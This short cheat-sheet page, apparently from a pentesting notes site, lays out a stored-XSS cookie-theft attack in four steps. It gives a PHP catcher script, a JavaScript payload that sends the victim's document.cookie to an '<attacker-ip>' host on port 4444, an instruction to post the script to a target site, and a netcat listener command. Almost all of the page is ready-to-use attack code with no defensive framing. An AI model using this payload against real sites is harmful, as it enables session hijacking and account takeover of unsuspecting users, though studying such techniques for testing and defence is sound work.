---
title: Cookie Hijacking Examples
desc: Steal user's Cookie values.
tags: [CookieHijacking, Web, XSS]
alts: [XSSCheatSheet]
website:
render_with_liquid: false
---

## PHP Cookie Grabbing with XSS

### 1. Create the payload for grabbing the Cookie when the other user will access your machine.

```php
// steal_cookie.php
<?php echo $_GET['cookie']; ?>
```

### 2. Create the script to force users to access your machine with the cookie.

```javascript
<script>document.location = 'http://<attacker-ip>:4444/steal_cookie.php?cookie='+document.cookie</script>
```

### 3. POST request with this script in the target website.

### 4. Listen on the port in your machine and wait for the other users access the target web page.

```sh
nc -lvnp 4444
```